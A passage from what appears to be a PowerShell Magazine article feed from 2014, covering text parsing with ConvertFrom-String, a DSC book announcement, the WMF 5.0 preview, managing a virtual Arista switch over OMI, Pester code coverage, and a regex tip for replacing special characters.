specify delimiter, names of properties, and you are good to go. But that’s not scenario in which this new cmdlets shines. I would argue that using ConvertFrom-Csv is as easy, and is possible in PowerShell 2.0.\nSecond mode (auto generated example-driven parsing) is much more interesting. Release notes mention FlashExtract is used to get the results.\nNote: You can find more on FlashExtract in publication “FlashExtract: A Framework for Data Extraction by Examples”, PLDI 2014, Vu Le, Sumit Gulwani, that can be found here.\nIn this mode, we hand ConvertFrom-String a template of data that we want to process. We need to follow a few rules when we prepare the template, but once we are done, PowerShell will look at any structured data as one of the well known formats. This article focuses entirely on this mode. We will take a look at real-world example of processing structured file (export from Opera mail client address book), how the workflow is simplified by using this new cmdlet in contrast with the one that depends on regular expressions. We will also take a look at ConvertFrom-String limitations and ‘gotchas’. And last but not least, we will use the new cmdlet to process more complex input data to create complex objects.\nStory of one address book transfer Almost two years ago, I had to help my wife to move her address book from Opera mail client to Outlook. After testing different options, I ended up with ‘Opera Hotlist version 2.0’ file as my input and needed to figure out a way to convert it to CSV, format that Outlook was able to ‘consume’. Luckily, file retrieved from Opera was human-readable. And after looking at the content I immediately came up with idea how to get what I wanted. Here is an example data file.\nOpera Hotlist version 2.0 Options: encoding = utf8, version=3 #CONTACT ID=11 NAME=Justynka CREATED=1195505237 MAIL=JUSTYNA66@gmail.com ICON=Contact0 #CONTACT ID=12 NAME=Leszek CREATED=1195677687 MAIL=Leszek@domena.pl ICON=Contact0 #CONTACT ID=13 NAME=Iwona Kwiatkowska CREATED=1196277590 MAIL=iwon.kwiat@op.pl ICON=Contact0 #CONTACT ID=14 NAME=JUSTYNA66@gmail.com CREATED=1347061687 MAIL=JUSTYNA66@gmail.com ICON=Contact0 #FOLDER ID=15 NAME=Kosz CREATED=1195505227 TRASH FOLDER=YES UNIQUEID=EAF22324295C86499476802CC76DE41E - #CONTACT ID=16 NAME=Ania CREATED=1195505237 MAIL=Ania.Nowak@poczta.com ICON=Contact0 #CONTACT ID=58 NAME=Bartek Bielawski CREATED=1381258759 MAIL=bartek.bielawski@live.com ICON=Contact0 #CONTACT ID=20 NAME=Poczta Grupowa URL= CREATED=1347221208 DESCRIPTION= ACTIVE=YES MAIL=xyz.abc.grupa.foo@gmail.com PHONE= FAX= POSTALADDRESS= PICTUREURL= ICON=Contact0 How did I solve this problem back then? I’ve used regular expressions and cmdlet with name that is similar to the one I would use today–ConvertFrom-StringData. You can see that each entry starts with the same string (#CONTACT). So there it was: easy way to -split records. Next thing I noticed–each record defines properties using ‘key=value’ syntax, something that ConvertFrom-StringData can translate into a hash table. When we have the hash table, creating an object is very easy. My work here was finished or so I thought. The actual workflow from idea to actual implementation is:\n Read file as single string (-Raw), split on ‘#CONTACT’, process each record with ConvertFrom-StringData OK, there is header, so let’s replace it Replace with ‘.*?’ failed… need to use ‘[\\s\\S]*?’ instead to cover multiline pattern Converting to hash table still fails–some records are prefixed with #FOLDER rather than #CONTACT Works for the most part, except there is ‘-‘ somewhere that causing it to fail, need to replace it All hash tables look OK, time to convert them to objects using New-Object  Final code looks simple!\n(Get-Content .\\opera.adr -Raw) -replace '^Opera[\\s\\S]*?#CONTACT' -split '#CONTACT|#FOLDER' | ForEach-Object { $Props = ConvertFrom-StringData -StringData ($_ -replace '\\n-\\s+') New-Object PSOBject -Property $Props | Select-Object Name, Mail } How workflow changes when we start to use ConvertFrom-String cmdlet? First of all, we don’t have to use regular expressions. Even better, we don’t need to know anything about it. All we need to do is describe structure of our file. We can either use a file, or string (preferably here-string) to define our template. To sum it up:\n Copy few records from file to here-string that we will use as a template Add curly brackets to identify name and mail of contact Make sure that you highlight property that starts new ‘set’ with ‘*’ suffix  Code is longer (mainly because of template definition), but it’s also easier to write. I didn’t have to extract data on my own, everything happened ‘automagically’.\nHere is the final code:\n$TemplateAdr = @' #CONTACT ID=11 NAME={Name*:Justynka} CREATED=1195505237 MAIL={Mail:JUSTYNA66@gmail.com} ICON=Contact0 #CONTACT ID=20 NAME={Name*:Poczta Grupowa} URL= CREATED=1347221208 DESCRIPTION= ACTIVE=YES MAIL={Mail:xyz.abc.grupa.foo@gmail.com} PHONE= FAX= POSTALADDRESS= PICTUREURL= ICON=Contact0 '@ Get-Content .\\opera.adr | ConvertFrom-String -TemplateContent $TemplateAdr | Format-Table -AutoSize Name, Mail Name Mail ---- ---- Justynka JUSTYNA66@gmail.com Leszek Leszek@domena.pl Iwona Kwiatkowska iwon.kwiat@op.pl Ewa Nowak EWA22@gmail.com Kosz Ania Ania.Nowak@poczta.com Bartek Bielawski bartek.bielawski@live.com Poczta Grupowa xyz.abc.grupa.foo@gmail.com It looks fine, but you have to be aware of limitations and ‘gotchas’.\nThere is always ‘but’… ConvertFrom-String cmdlet can do wonders for us but you can walk into problems if you are not careful.\nFirst and foremost, examples! You have to see patterns and make sure that PowerShell is aware of all possibilities. If your template won’t cover certain scenario you can end up with partial results (worse, as you may not see that something is missing at first) or with following error message:\n_[28,27: ConvertFrom-String] ConvertFrom-String appears to be having trouble parsing your data using the template you’ve provided. We’d love to take a look at what went wrong, if you’d li\nke to share the data and template used to parse it. We’ve saved these files to C:\\Users\\Bartek\\AppData\\Local\\Temp\\smt5asdi.1×1.input.txt and C:\\Users\\Bartek\\AppData\\Local\\Temp\\smt5asdi.1\nx1.template.txt – feel free to attach them in a mail to psdmfb@microsoft.com. We will review all submissions, although we can’t guarantee a response._\nPartial results can have two flavours. Either an entire item is missing or a property of the item is missing. The former is very hard to spot. Both are result of the fact that examples you provided in your template are too specific. For example, if I have items in address book with the name that is same as e-mail address and both examples in my template suggest ‘FirstName LastName’ or ‘Name’ format, this record will be ignored. If an e-mail is provided in a format different than the one seen in examples, we may end up with records that don’t have ‘Mail’ property. Last but not least, at times you can get very unpredictable results. For example, when I worked on this article I ‘cleaned’ address book entries and my template. I noticed that in one case ‘Mail’ property was there but value contains only part of e-mail address.\nHere is the sample data, template, and results I retrieved.\n$otherTemplate = @' {First*:Jan} {Last:Fasola} MAIL={Mail:Jan@Fasola.com} {First*:Not} {Last:Real} MAIL={Mail:Just@Similar.to} '@ $otherData = @' Jan Fasola MAIL=Jan@Fasola.com not there MAIL=all@lower.case Ewa Kowalska MAIL='Ewa' \u0026amp;lt;Ewa@Kowalska.com\u0026amp;gt; Missing2 Cause MAIL=used@number Silly Cut MAIL=causeIt@Expects.up '@ $otherData | ConvertFrom-String -TemplateContent $otherTemplate | Format-Table -AutoSize First, Last, Mail First Last Mail ----- ---- ---- Jan Fasola Jan@Fasola.com Ewa Kowalska Silly Cut It@Expects.up As you can see, examples in my template are very specific. Both the first and last names start with upper case letter. In both records ‘Mail’ starts with upper case too. There are no numbers in name. Another thing that you probably noticed is that it does not really have to be actual example from input data, just need to follow same pattern.\nIn the output two items are missing. One has full name in all lower case and the second contains a number in the ‘First’ field. Our template doesn’t ‘allow’ such items, so both were discarded. Next, Mail for ‘Ewa Kowalska’ doesn’t follow the pattern we see in template. So, it’s not visible on this object. And, last but not least, in the last record Mail is ’causeIt@Expects.up’ but in our output first part (starting with lower case) was removed. How to fix it? Just modify one of examples:\n$fixedTemplate = @' {First*:Jan} {Last:Fasola} MAIL={Mail:Jan@Fasola.com} {First*:not2} {Last:real} MAIL={Mail:'Just' \u0026amp;lt;similar@to.ewa\u0026amp;gt;} '@ $otherData | ConvertFrom-String -TemplateContent $fixedTemplate Alternatively, we could just add records that were missing/incomplete to the template. In my opinion, this method is following the ‘KISS’ principle. It may take more time but we are not forced to figure out what went wrong.\nThere are other potential issues, e.g. here François-Xavier Cat identified a problem when you want to capture netstat -na output and ‘Status’ property is not present for UDP connections (and suggested a nice workaround). Also, he shows another real-life example of ConvertFrom-String use case, so it’s definitely worth reading.\nComplex is possible So far, we worked on the flat data. ConvertFrom-String however is able to process more complex data too. We can have nested properties, that are collections of objects. In other words: any file (or other input string data) can now be seen as XML/JSON. We just need to identify nested properties and cover them in our template. We will use output from Sysinternals handle -u command. You can download it here. Example results:\nIn PowerShell it would map to single object for each process, with property that would hold all handles, each being object with three properties. With that in mind we can start building our template. Because we already know that data does not have to be “real” we will try to understand output and create template based on that information, leaving only lines that seem necessary for PowerShell to understand all input (and process it correctly):\n$template = @' ------------------------------------------------------------------------------ {ProcessName*:Testing} pid: {PID:4} {User:\\\u0026lt;unable to open process\u0026gt;} {Id*:18}: {Type:File} (R--) {Name:E:\\$Extend\\$RmMetadata\\$TxfLog\\$TxfLogContainer00000000000000000001} {Id*:90}: {Type:File} (R--) {Name:\\clfs} ------------------------------------------------------------------------------ {ProcessName*:someprocess.exe} pid: {PID:6} {User:NT AUTHORITY\\SYSTEM} {Id*:C}: {Type:File} (---) {Name:C:\\Windows\\System32} {Id*:A4}: {Type:Section} {Name:\\Sessions\\1\\Windows\\SharedSection} ------------------------------------------------------------------------------ {ProcessName*:Extend64.exe} pid: {PID:2512} {User:EMIS\\Bartek} {Id*:C}: {Type:File} (RW-) {Name:C:\\Windows} {Id*:28}: {Type:File} (R-D) {Name:C:\\Windows\\System32\\en-US\\conhost.exe.mui} '@ None of these processes is running on my system. I copied lines with handles information, but changed them to make sure I cover all scenarios. With this template I could parse output from handle and convert it to complex objects. The only problem is that PowerShell adds ExtentText to all objects generated (including nested objects). And even though for testing/ debugging it may be handy, it’s usually not needed in the ‘final product’. Another problem I had was the fact that my handles were stored in automatically named property ‘Items’. I didn’t manage to find a way to change this name within template, so I’ve used Select-Object to do that for me.\nhandle -u | ConvertFrom-String -TemplateContent $Template | Select-Object ProcessName, PID, User, @{ Name = 'Handles' Expression = { $_.Items | Select-Object * -ExcludeProperty ExtentText } } I would love to have parameter that would disable adding ‘ExtentText’ property (or better yet: leave it out as a default behaviour, and adding it only if user requests it with switch parameter). Another problem that I had when I tried to figure out correct template was lack of verbose messages. The only way to get some feedback on ‘how’ is to use -Debug parameter, and even than we only get output if operation succeeds:\nDEBUG: Property: ProcessName Program: ESSL((PrecedingEndsWith(Hyphen(\\-), Hyphen(\\-), Hyphen(\\-))): 0, 1, ...: ε...ε, 1 + Alphabet([\\p{Lu}\\p{Ll}\\-.]+)...Dynamic Token(\\ pid:\\ )(\\ pid:\\ ), Number([0-9]+(\\,[0-9]{3})*( \\.[0-9]+)?), WhiteSpace(( )+), 1) ------------------------------------------------- Property: PID Program: ESSL((Contains(Dynamic Token(\\ pid:\\ )(\\ pid:\\ ), Number([0-9]+(\\,[0-9]{3})*(\\.[0-9]+)?), WhiteSpace(( )+), 1)): 0, 1, ...: Alphabet([\\p{Lu}\\p{Ll}\\-.]+), Dynamic Token(\\ pid:\\ ) (\\ pid:\\ )...Number([0-9]+(\\,[0-9]{3})*(\\.[0-9]+)?), WhiteSpace(( )+), 1 + Alphabet([\\p{Lu}\\p{Ll}\\-.]+), Dynamic Token(\\ pid:\\ )(\\ pid:\\ ), Number([0-9]+(\\,[0-9]{3})*(\\.[0-9]+)?)...White Space(( )+), 1) ------------------------------------------------- Property: User Program: ESSL((Contains(all lower((?\u0026amp;lt;![\\p{Lu}\\p{Ll}])(\\p{Ll})+), Colon(\\:), WhiteSpace(( )+), 1)): 0, 1, ...: WhiteSpace(( )+), Number([0-9]+(\\,[0-9]{3})*(\\.[0-9]+)?), WhiteSpace(( )+).. .ε, 1 + ε...ε, 0) ------------------------------------------------- Property: Id Program: ESSL((Contains(Colon(\\:), WhiteSpace(( )+), Camel Case(\\p{Lu}(\\p{Ll})+), 1)): 0, 1, ...: WhiteSpace(( )+)...ε, 1 + ε...Colon(\\:), WhiteSpace(( )+), Camel Case(\\p{Lu}(\\p{Ll})+), 1) ------------------------------------------------- Property: Type Program: ESSL((Contains(Colon(\\:), WhiteSpace(( )+), Camel Case(\\p{Lu}(\\p{Ll})+), 1)): 0, 1, ...: Colon(\\:), WhiteSpace(( )+)...Camel Case(\\p{Lu}(\\p{Ll})+), WhiteSpace(( )+), 1 + Colon(\\ :), WhiteSpace(( )+), Camel Case(\\p{Lu}(\\p{Ll})+)...WhiteSpace(( )+), 1) ------------------------------------------------- Property: Name Program: ESSL((Contains(Colon(\\:), WhiteSpace(( )+), Camel Case(\\p{Lu}(\\p{Ll})+), 1)): 0, 1, ...: WhiteSpace(( )+)...ε, -1 + ε...ε, 0) ------------------------------------------------- It would be great to get some feedback when parsing fails, for example which part of file/rule was responsible for it. Sending input and template to authors every time it fails seems like overkill. On the other hand: fixing these errors looks like shooting in the dark. In my opinion this cmdlet should help a lot of administrators to parse even most complex command results/log files without deep knowledge of regular expressions. And even though I’m huge regex fan, I’m happy that we got yet another tool to parse text in PowerShell.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/09/09/using-the-convertfrom-string-cmdlet-to-parse-structured-text/","tags":["How To"],"title":"Using the ConvertFrom-String cmdlet to parse structured text"},{"categories":["News","PowerShell DSC"],"contents":"If you have followed my posts here and/or heard me speaking in the last 6 to 8 months, I have been mostly focusing on Desired State Configuration. At the same time, I was busy writing a book for Apress on DSC. I am very happy to announce that this book is available for pre-order now. As I write this post, the content of the book is final and ready if you are a part of the Alpha program.\nThis will be my first published book and I am excited. This book will be available through Amazon and various other sales channels and will be available in all book formats. I must thank the PowerShell team members (Abhik, Nana, Hemant, Travis, and everyone on the team) and the community. Especially, I have learned a lot about DSC from my friend and fellow MVP Steven Murawski.\nThis book provides an overview of Windows PowerShell for beginners. I did this to help people who want to use DSC but don’t know much about PowerShell. Windows PowerShell Desired State Configuration Revealed will take you through this new technology from start to finish and demonstrates the DSC interfaces through Windows PowerShell. This starts with an overview of the configuration management features in Windows, followed by a discussion of the architecture of DSC and its components. You’ll then explore DSC’s built-in features and resources, followed by some of the different methods provided for delivering configuration information within your ecosystem, and learn about configuration monitoring and reporting. In the latter part of the book, you’ll find out how to get more power out of DSC by writing your own custom DSC resources, including a range of useful examples, and the book concludes with vital information on deploying and troubleshooting DSC in a production environment, along with some expert tips and tricks you might find useful along the way.\nHere is what the ~320 pages of DSC goodness contains!\nTable of Contents Part I: Introduction to Windows PowerShell\nChapter 1: Beginning Windows PowerShell\nChapter 2: Introducing Windows Remote Management CIM\nPart II: Desired State Configuration\nChapter 3: Introducing Desired State Configuration\nChapter 4: Getting Started with DSC\nChapter 5: Using Built-in DSC Resources\nChapter 6: Building Advanced DSC Configurations\nPart III: Advanced DSC Concepts and Tips\nChapter 7: DSC Configuration Delivery Modes\nChapter 8: Monitoring, Correcting, and Reporting Configuration\nChapter 9: Building Custom DSC Resources\nChapter 10: Troubleshooting Common DSC Issues\nChapter 11: DSC – From the Field\nAppendix A: DSC Community Resources\nAppendix B: WMF 5.0 and DSC for Linux\nI hope you will like this work and feel free to reach out to me if you have any feedback or suggestions to make this better. WMF 5.0 brings several changes to DSC and I think it is time for me to get back to writing! 🙂\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/09/09/book-announcing-windows-powershell-desired-state-configuration-revealed/","tags":["News","PowerShell DSC"],"title":"Book: Announcing Windows PowerShell Desired State Configuration Revealed"},{"categories":["News"],"contents":"An updated version of WMF 5.0 preview is now available with a great set of enhancements and new features. Some of these changes are:\n Generate Windows PowerShell cmdlets based on an OData endpoint Manage .ZIP files with new cmdlets DSC Authoring Improvements in Windows PowerShell ISE New Attribute for defining DSC meta-configuration Use partial configurations DSC Cross-computer synchronization through DSC Get the current DSC configuration status Compare, Update, and Publish DSC configurations Audit Windows PowerShell usage by transcription and logging Extract and parse structured objects out of string content Extend the item noun to enable Symbolic Links Develop with classes in Windows PowerShell Register a PSRepository with PowerShell Get Network Switch management through Windows PowerShell (improvements)  You can download the preview release at: Windows Management Framework 5.0 Preview September 2014. This can be installed only on Windows 8.1 and Windows Server 2012 R2 systems.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/09/05/windows-management-framework-5-0-september-2014-preview-is-available-for-download/","tags":["News"],"title":"Windows Management Framework 5.0 (September 2014) preview is available for download"},{"categories":["OMI"],"contents":"One of the first tasks I used PowerShell for was related to Windows Management Instrumentation (WMI). I had heard about WMI before I started my adventure with PowerShell, but never tried it myself. Due to the ease of using WMI in PowerShell, I could get answers from any Windows box to the questions I never dared to ask before. Then a few years passed…\nIn 2012 Microsoft announced Open Management Infrastructure (OMI), an open source implementation of WMI that could run on almost any device.\nWhen I’ve started playing with OMI I decided to use Linux as my guinea pig, because it was easier to get a Linux box up and running at relatively low cost. I just had to spin up an extra VM and install Linux on it. Then download and install the OMI binaries and last but not least – create an OMI provider that was doing something useful. You can find all details about this journey on my blog.\nOne thing I haven’t considered back then was using virtualization to ‘mimic’ network gears that I could not get otherwise. But when Microsoft shipped a preview of PowerShell 5.0 with a NetworkSwitch module, I started looking for a way to play with this module without getting network team to borrow me one of their ‘toys’. And that’s how vEOS came about: it’s a virtual platform provided by Arista that behaves like one of Arista own devices. It has beta support for Hyper-V (my virtualization platform of choice since I migrated to Windows 8). In this article I would like to describe my path from idea to the point when I could use NetworkSwitch module to manage my own (though virtual) Arista switch.\nBuilding a demo machine The first thing you have to do is to download a boot image and a VMDK file (requires login). The next thing I did was converting the VMDK file to a format that my Hyper-V host could understand: VHD. There are several ways to do it, and I decided to use a tool provided by Microsoft:\nMicrosoft Virtual Machine Converter Solution Accelerator. This tool comes with two command line utilities. One I’ve used, MVDC.exe, simply converts one virtual disk format to the other:\nNew-Alias -Name MVDC -Value 'C:\\Program Files (x86)\\Microsoft Virtual Machine Converter Solution Accelerator\\MVDC.exe' Push-Location E:\\VMs\\VHDx MVDC .\\vEOS-4.13.7M.vmdk vEOS.vhd Once the file is converted we can move on to creating and configuring the virtual machine. We have to remember that vEOS can only be used with legacy network interfaces and that it supports up to four of them. We also have to make sure that the VM will boot from the image provided by Arista:\nNew-VM -Name EOS -BootDevice CD -VHDPath .\\vEOS.vhd -MemoryStartupBytes 1GB -Generation 1 # Need legacy adapters... Get-VMNetworkAdapter -VMName EOS | Remove-VMNetworkAdapter $Adapters = @{ VMName = 'EOS' SwitchName = 'Internal' IsLegacy = $true } Add-VMNetworkAdapter @Adapters -Name Mgmt Add-VMNetworkAdapter @Adapters -Name Eth1 Add-VMNetworkAdapter @Adapters -Name Eth2 Add-VMNetworkAdapter @Adapters -Name Eth3 Set-VMDvdDrive -VMName EOS -Path E:\\VMs\\ISO\\Aboot-veos-2.0.8.iso Start-VM EOS And that’s it from the Hyper-V perspective. We now move on to our switch where we have to configure a management interface (so that we can connect using TCP/IP) and enable/configure OMI.\nSwitch configuration The initial login doesn’t require any password. We specify the default username (admin) and once we are in–we turn on privileged commands using the enable command. To configure management interface we need to get to the correct context and run ip:\nconfigure interface management 1 ip address 192.168.200.66/24 exit In order to enable and configure OMI we need to browse to a different context and enable it. We will also change the HTTP/HTTPS ports to the ones that we know and love. Mind that even though when you check the configuration ports they show up as 7778 and 7779, OMI listens on 5985/5986 anyway, so we are doing it to avoid confusion:\nmanagement cim-provider no shutdown http 5985 https 5986 exit Another change is required–because we can’t use the CIM cmdlets with OMI if the password is blank we need to configure a password for the root account:\naaa root secret P@$$w0rd And the final step–we need to modify the access list to allow WSMAN over HTTP and HTTPS traffic:\nip access-list OMI 10 permit tcp 192.168.200.0/24 any eq 5985 5986 # ... other permits that we want... e.g. 20 permit tcp any any eq ssh exit control-plane ip access-group OMI in exit Our switch is now configured and it is ready to welcome our first CIM session.\nManaging the switch using CIM cmdlets We can connect to the switch using both HTTP and HTTPS, depending on our needs. If we want to use SSL we will have to disable any checks, because the certificate on our switch is not trusted on our Windows machine:\n$rootPassword = ConvertTo-SecureString -AsPlainText -Force -String 'P@$$w0rd' $switchParams = @{ ComputerName = '192.168.200.66' Credential = New-Object pscredential -ArgumentList root, $rootPassword Authentication = 'Basic' SessionOption = New-CimSessionOption -UseSsl -SkipCACheck -SkipCNCheck -SkipRevocationCheck } $cimSwitch = New-CimSession @switchParams Our CIM session is created, so now we can start managing the switch with CIM cmdlets. Unfortunately, we won’t get any discoverability features that we get with WMI:\nGet-CimClass -CimSession $cimSwitch -ClassName CIM_* The WinRM client received an HTTP server error status (500), but the remote service did not include any other information about the cause of the failure. (raised by: Get-CimClass)  If we are not running PowerShell 5.0 than the best option is to look for documentation of OMI/CIM provider implemented on Arista switches, or make some intelligent guesses:\nGet-CimClass -CimSession $cimSwitch -ClassName Arista_EthernetPort NameSpace: root/cimv2 CimClassName CimClassMethods CimClassProperties ------------ --------------- ------------------ Arista_EthernetPort {RequestStateChan... {InstanceID, Caption, Description, ElementName...} We’ve found the class, time to take a look at its instances:\nGet-CimInstance -CimSession $cimSwitch -ClassName Arista_EthernetPort | Format-Table -AutoSize DeviceId, OperationalStatus, EnabledState DeviceId OperationalStatus EnabledState -------- ----------------- ------------ Ethernet1 {2} 2 Ethernet2 {2} 2 Ethernet3 {2} 2 Management1 {0} 2 Managing the switch using the NetworkSwitch module PowerShell 5.0 preview comes with a NetworkSwitch module that takes away necessity of knowing class names. Instead, we can just load the module, redirect any command in it to our switch, and take advantage of work done by Microsoft:\nImport-Module -Name NetworkSwitch $PSDefaultParameterValues.'*-NetworkSwitch*:CimSession' = $cimSwitch Get-NetworkSwitchEthernetPort -DeviceId Management1 | Set-NetworkSwitchPortProperty -Property @{ Description = 'This is just a test' } And sure enough: our changes are reflected on the remote end:\nThere are many other elements we can manage using this module:\nGet-Command -Module NetworkSwitch | Group-Object Noun | Format-Table Name, @{ Name = 'Verbs' Expression = { $_.Group.Verb -join ', ' } } -AutoSize Name Verbs ---- ----- NetworkSwitchEthernetPort Disable, Enable, Get NetworkSwitchFeature Disable, Enable, Get NetworkSwitchVlan Disable, Enable, Get, New, Remove NetworkSwitchGlobalData Get NetworkSwitchEthernetPortIPAddress Remove, Set NetworkSwitchConfiguration Restore, Save NetworkSwitchPortMode Set NetworkSwitchPortProperty Set NetworkSwitchVlanProperty Set As you can see we can configure IP addresses on ports, enable or disable switch features, add and configure VLANS and more. All of this is possible with an OMI provider on the remote end and the NetworkSwitch module on the local computer.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/09/02/omi-and-networkswitch-module/","tags":["OMI"],"title":"OMI and NetworkSwitch module"},{"categories":["Pester","DevOps"],"contents":"Introduction I have a confession to make… I don’t actually practice TDD or BDD yet. I see the value of having unit tests, but I’ve been writing scripts for so many years now–most of that time without automated tests–that it’s been difficult to change my habits and get into that 30-second micro cycle of “Red-Green-Refactor”. I still tend to write pseudo code for a function and flesh it out from there, only writing tests when it’s basically done. Shame on me!\nOne of the benefits of practicing Test-Driven Development is that you’re virtually guaranteed to have a complete suite of unit tests by the time the code is finished. However, what if you’re starting to work on someone else’s code which doesn’t have a full test suite? Or what if you’re like me (shame!) and didn’t write the tests and the code at the same time? That’s where a Code Coverage analysis tool comes in handy. It’s a tool which tells you how much of your code was executed by your tests.\nWhen I started researching this topic, I found that there weren’t too many options available for PowerShell yet. The two examples that I found came from Lee Holmes and James Brundage: http://www.leeholmes.com/blog/2008/05/20/generating-code-coverage-from-powershell-scripts/ and http://scriptcoverage.start-automating.com/ , respectively. Both of these gave me valuable insights into how to approach this problem, but the output wasn’t quite what I wanted.\nIn Pester 3.0, we’ve added a feature to analyze code coverage while the tests are being executed. By using Invoke-Pester’s -CodeCoverage parameter, you tell Pester which sections of code you are interested in checking for coverage. This can be entire .ps1 or .psm1 files, specific functions within those files, or regions defined by starting and/or ending line numbers. Pester will use PowerShell’s built-in AST and breakpoint features to keep track of which commands get executed throughout the tests, and give you a report on which commands where missed. (Note: Unlike most of Pester’s functionality, using the Code Coverage feature requires PowerShell 3.0 or later.)\nDemonstration Here’s a short example of this new feature in action; my sample Script.Tests.ps1 file fails to call one of the two functions at all, and only goes through one branch of the “if” statement in FunctionTwo:\nThere are a couple of other ways you can use the -CodeCoverage parameter:\n When passing in strings as paths, you can use wildcards:  Invoke-Pester -CodeCoverage '.\\*.ps1', '.\\*.psm1'  If you want to filter down the coverage analysis to just parts of a file (a particular function or range of lines), you can pass in a hash table instead. The keys to this hash table are Path, Function, StartLine, and EndLine (of which only Path is required). If you use Function, StartLine and EndLine are ignored. All 4 keys can be shortened to their first letter, if you prefer. The string assigned to the Function key may also contain wildcards.  If you are also using Invoke-Pester’s -PassThru switch, there will be a CodeCoverage property on the output object which contains the same information as what is displayed at the console.  Limitations of the current implementation You may have noticed that the sample Script.ps1 is twenty lines long, but the code coverage reports say that there are only “4 analyzed commands.” This is due to how the coverage analysis is currently implemented; it uses breakpoints to keep track of which commands are executed. PowerShell breakpoints are not triggered by things like function declarations, param blocks (except for ValidateScript), keywords (try/catch, etc), or open and close braces. Only PowerShell “commands” can trigger breakpoints, which includes calls to functions, cmdlets, external programs and .NET methods, as well as expressions (such as $DoSomethingDifferent inside the parentheses if the “if” statement, and the strings ‘I like switches.’ and ‘No switch for you!’ after the “return” keywords in FunctionTwo.) While this does present some theoretical limitations on the report, in general, there will be enough information there to identify sections of code that have not been executed by the test script. The trade-off was that using breakpoints made this first version of the feature very easy to write.\nIs it broken? Ugly? Insulted your mother? Let us know! If you’re using Pester, please give the new version a try. If you run into any problems or have any suggestions, please post an issue on https://github.com/pester/Pester. (Or, if you prefer, fix it yourself and submit a pull request!)\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/09/01/new-feature-in-pester-3-0-code-coverage-metrics/","tags":["Pester","DevOps"],"title":"New feature in Pester 3.0:  Code Coverage metrics"},{"categories":["Tips and Tricks"],"contents":"Once upon a time I answered Stack Overflow question about easy way to replace ‘special’ characters with something ‘web safe’. I answered question with the following code:\n$Replacer = @{ Å = 'aa' é = 'e' } $string_to_fix = 'æøåéüÅ' $pattern = \u0026quot;[$(-join $Replacer.Keys)]\u0026quot; [regex]::Replace( $string_to_fix, $pattern, { $Replacer[$args[0].value] } ) My answer was accepted by the person asking question, but I was not fully satisfied with it. It maybe worked fine for him, but when I tried to apply the same pattern to text with Polish national characters I couldn’t get what I wanted. My problem was the fact that hash tables in PowerShell are case-insensitive. To cover both upper and lower case characters I would have to do it in two steps:\n$lower = @{ ą = 'a' ć = 'c' ę = 'e' ł = 'l' ń = 'n' ó = 'o' ś = 's' ż = 'z' ź = 'z' } $patternLower = \u0026quot;[$(-join $lower.Keys)]\u0026quot; $lowerReplaced = [regex]::Replace( 'Zażółć GĘŚLĄ jaźń', $patternLower, { $lower[$args[0].value] } ) $patternUpper = $patternLower.ToUpper() [regex]::Replace( $lowerReplaced, $patternUpper, { ($lower[$args[0].value]).ToUpper() } ) Zazolc GESLA jazn In the first step I use $lower hash table and match any lower-case Polish character. I save result to $lowerReplace variable and use it in the next Replace() call. In the second step I match upper-case Polish characters. Hash table is case-insensitive so it will return lower-case replacement. All I need to do is to convert it ToUpper().\nI would prefer to do it in one step, with hash table (or any other dictionary) that is case-sensitive. I didn’t have time to investigate it further back than. But few weeks ago I came across solution for my problem. Even better – it was used in a tip that had exactly same purpose! It was in PowerShell.com tip about converting special characters..\nWith information and code provided in that tip I was able to build case-sensitive hash table. But instead of listing all letters one by one I decided to take it step further and build hash table slightly different:\n$Replacer = New-Object hashtable foreach ($letter in Write-Output ą a Ą A ć c Ć C ę e Ę E ł l Ł L ń n Ń N ó o Ó O ś s Ś S ż z Ż Z ź z Ź Z) { $foreach.MoveNext() | Out-Null $Replacer.$letter = $foreach.Current } First, I create simple array by using the Write-Output cmdlet. Each item that I want to replace is followed by a string that should be used as a replacement string. This array is processed by foreach() loop. Inside this loop I use $foreach automatic variable. With $foreach.MoveNext() method and $foreach.Current property I can access two elements in a single cycle. Note that $letter is not updated when MoveNext() method is used.\nOnce our case-sensitive hash table is defined we can use it in Replace() method:\n$pattern = \u0026quot;[$(-join $Replacer.Keys)]\u0026quot; [regex]::Replace( 'Zażółć GĘŚLĄ jaźń', $pattern, { $Replacer[$args[0].value] } ) Zazolc GESLA jazn ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/26/pstip-replacing-special-characters/","tags":["Tips and Tricks"],"title":"#PSTip Replacing special characters"},{"categories":["PowerShell DSC","News"],"contents":"Windows PowerShell team published a new wave of DSC Resource Kit. It is Wave 6!\nThis wave contains four new resources:\n xChrome – Helps installing Chrome browser xFirefox – Helps installing Firefox browser xSafeHarbor – Installs the Safe Harbor sample xRemoteDesktopAdmin – Enables management of RDP and Firewall settings for RDP  Installation To install all DSC Resource Kit Modules\n Unzip the content under $env:ProgramFiles\\WindowsPowerShell\\Modules folder  To confirm installation:\n Run Get-DSCResource to see that all of the resources on this page are among the DSC resources listed  Requirements Most items in this release require the latest version of PowerShell (v4.0, which ships in Windows 8.1 or Windows Server 2012 R2). To easily use PowerShell 4.0 on older operating systems, install WMF 4.0 . Please read the installation instructions that are present on both the download page and the release notes for WMF 4.0.\nSome samples and resources in this release the Windows Management Framework (WMF) 5.0 Experimental Release July 2014, which contains functionality that has been updated from WMF 4.0. Each module with this requirement will be clearly identified. The WMF 5.0 Experimental Release July 2014 is available for installation on Windows 8.1 and Windows Server 2012 R2. More information about the content of the WMF 5.0 Experimental Release July 2014 is available in its dedicated release notes, included in the download links below.\n**Notice: **WMF 5.0 Experimental Release July 2014 is delivered as an MSU installation package via the links below. Installing this will update the PowerShell, WMI, and WinRM components of your Windows installation. change the state of your machine, as opposed to the scripts in Resource Kit. If you choose “Open” from either the x64 or x86 direct download links, the package will be downloaded, and the install will update your system with these new components.\nDisclaimer: There are some scenarios in WMF 5.0 Experimental July 2014 with incomplete or missing functionality. This is also included in the dedicated release notes, which are included in the download links below.\nDirect Download Links:\n Release Notes x64 MSU x86 MSU  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/21/dsc-resource-kit-wave-6-is-here/","tags":["PowerShell DSC","News"],"title":"DSC 